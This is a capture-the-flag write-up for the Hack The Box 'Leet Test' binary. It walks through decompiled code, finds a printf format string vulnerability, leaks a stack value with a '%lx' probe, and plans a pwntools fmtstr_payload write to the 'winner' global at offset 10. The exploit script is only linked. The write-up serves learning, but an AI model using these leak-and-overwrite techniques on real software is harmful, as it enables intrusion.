# Leet Test
As usual, let's have a look at what the challenge is at face value:
```
Welcome to HTB!
Please enter your name: Williloo
Hello, Williloo
Sorry! You aren't 1337 enough :(
Please come back later
------------------------
Welcome to HTB!
Please enter your name: Test
Hello, Test
Sorry! You aren't 1337 enough :(
Please come back later
------------------------
Welcome to HTB!
Please enter your name:
```
It seems to be a continuous stream of asking for a name, before printing it: let's have a look at the binary, but straight away, 
the printing, if done poorly, can expose a format string vulnerability.

## Code 
```
004012ca  int32_t main(int32_t argc, char** argv, char** envp)

004012ca  {
004012e2      void* fsbase;
004012e2      int64_t var_10 = *(uint64_t*)((char*)fsbase + 0x28);
004012ed      initialize();
00401303      int32_t fd = open("/dev/urandom", 0);
0040132a      uint32_t buf;
0040132a      read(fd, &buf, 4);
0040133c      close(fd);
0040134a      buf = ((uint32_t)((int16_t)buf));
0040134a      
0040135c      while (true)
0040135c      {
0040135c          printf("Welcome to HTB!\nPlease enter yo…");
00401377          void var_128;
00401377          fgets(&var_128, 0x100, stdin);
00401388          printf("Hello, ");
0040139c          printf(&var_128);
004013b5          char rax_14;
004013b5          
004013b5          if ((buf * 0x1337c0de) != winner)
004013be              rax_14 = 0;
004013b5          else
004013b7              rax_14 = 1;
004013b7          
004013c5          if (rax_14 != 0)
004013c5              break;
004013c5          
00401457          puts("Sorry! You aren't 1337 enough :(…");
0040135c      }
0040135c      
004013dc      int32_t fd_1 = open("flag.txt", 0);
004013ec      int64_t buf_1 = malloc(0x100);
00401414      read(fd_1, buf_1, 0x100);
00401426      close(fd_1);
00401441      printf("\nCome right in! %s\n", buf_1);
0040144b      exit(0);
0040144b      /* no return */
004012ca  }
```
Aha! When we print the name, we don't use printf("%s", var_128), but rather print directly from the address. This introduces a format string
vulnerability, where we can write %x etc to read off memory. The way to get the flag in this case is for rax_14 to not equal 0, breaking out
of the loop. This can only be done when buf, a randomly generated number, times 0x1337c0de is equal to winner. Binary Ninja tells us that winner
is stored at 0x404078, and contains 0xcafebabe. While we can repeatedly restart the code until we generate a buffer that satisfies the condition,
let's expose this format string vulnerability!

## Exploit Formation
Let's formulate a plan of attack before we begin. As 0x1337c0de is a constant, we can't do much about it. Between buf and winner, it is much
easier to alter winner as we already know its address, and buf is on the stack so we can find it via format string vulnerabilities. Let's carry
this out. 
To start, let's find where buf is stored. Looking at the disassembly, we can see that if we set a breakpoint at 0x004013a7, the value stored in
$eax is buf.
```
00401350  488d3dc10c0000     lea     rdi, [rel data_402018]  {"Welcome to HTB!\nPlease enter yo…"}
00401357  b800000000         mov     eax, 0x0
0040135c  e87ffdffff         call    printf
00401361  488b15282d0000     mov     rdx, qword [rel stdin]
00401368  488d85e0feffff     lea     rax, [rbp-0x120 {var_128}]
0040136f  be00010000         mov     esi, 0x100
00401374  4889c7             mov     rdi, rax {var_128}
00401377  e8a4fdffff         call    fgets
0040137c  488d3dbe0c0000     lea     rdi, [rel data_402041]  {"Hello, "}
00401383  b800000000         mov     eax, 0x0
00401388  e853fdffff         call    printf
0040138d  488d85e0feffff     lea     rax, [rbp-0x120 {var_128}]
00401394  4889c7             mov     rdi, rax {var_128}
00401397  b800000000         mov     eax, 0x0
0040139c  e83ffdffff         call    printf
004013a1  8b85ccfeffff       mov     eax, dword [rbp-0x134 {buf}]
004013a7  69d0dec03713       imul    edx, eax, 0x1337c0de
004013ad  8b05c52c0000       mov     eax, dword [rel winner]
004013b3  39c2               cmp     edx, eax
004013b5  7507               jne     0x4013be
```
Now that we found what buf is, we can spam %lx into our format string vulnerability to see if its stored in the stack:
```
Welcome to HTB!
Please enter your name: %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx %lx
Hello, 7fffffffbdc0 0 7ffff7e9f887 7 0 150000 fb5d00000840 3 c000 20786c2520786c25 20786c2520786c25 20786c2520786c25
...
pwndbg> p/x $eax
$4 = 0xfb5d
```
We can see that buf is stored in the first 4 bytes of the 7th %lx. This means we can extract it using pwntools and %7$x.
From here, we just need to write in our answer (buf * 0x1337c0de) into winner. Usually, we would use some sort of %n
exploit, but luckily for us, pwntools automates the process using the fmtstr_payload function. We just need to input the
offset for when we can control the stack. Looking back at our output from before, we know the hex for %lx(space) is 256c7820,
which stored in little endian form is 20786c25. Thus, our buffer begins on the 10th byte, meaning our offset is 10. We
can input this all into fmtstr_payload, which automates the process for us.

Exploit [here](exploit.py)